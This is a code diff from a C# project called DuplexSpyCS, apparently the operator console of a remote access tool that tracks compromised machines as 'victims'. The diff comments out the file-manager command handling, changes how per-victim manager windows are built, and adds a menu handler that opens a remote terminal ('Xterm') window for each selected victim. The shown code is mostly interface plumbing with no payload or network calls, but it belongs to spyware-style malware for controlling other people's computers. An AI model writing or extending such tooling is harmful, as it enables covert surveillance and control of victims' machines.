@@ -346,6 +346,8 @@ namespace DuplexSpyCS
                 #endregion
                 #region FileMgr
 
+                /*
+
                 else if (cmd[0] == "file")
                 {
                     frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
@@ -626,6 +628,8 @@ namespace DuplexSpyCS
                         f.fileLV_Refresh();
                     }
                 }
+
+                */
 
                 #endregion
                 #region TaskMgr
@@ -913,6 +917,7 @@ namespace DuplexSpyCS
                 }
 
                 #endregion
+
                 #region System
 
                 else if (cmd[0] == "system")
@@ -1543,10 +1548,9 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
-                frmManager f = new frmManager();
+                frmManager f = new frmManager(v);
                 f.Text = $@"Manager\\{v.ID}";
                 f.Tag = Function.Manager;
-                f.v = v;
 
                 f.Show();
             }
@@ -2173,6 +2177,23 @@ namespace DuplexSpyCS
         private void toolStrip2_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
         {
 
+        }
+
+        private void toolStripMenuItem45_Click(object sender, EventArgs e)
+        {
+            List<clsVictim> ls = listView1.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+
+            foreach (var victim in ls)
+            {
+                frmXterm f = clsTools.fnFindForm<frmXterm>(victim);
+                if (f == null)
+                {
+                    f = new frmXterm(victim);
+                    f.Show();
+                }
+
+                f.BringToFront();
+            }
         }
     }
 }
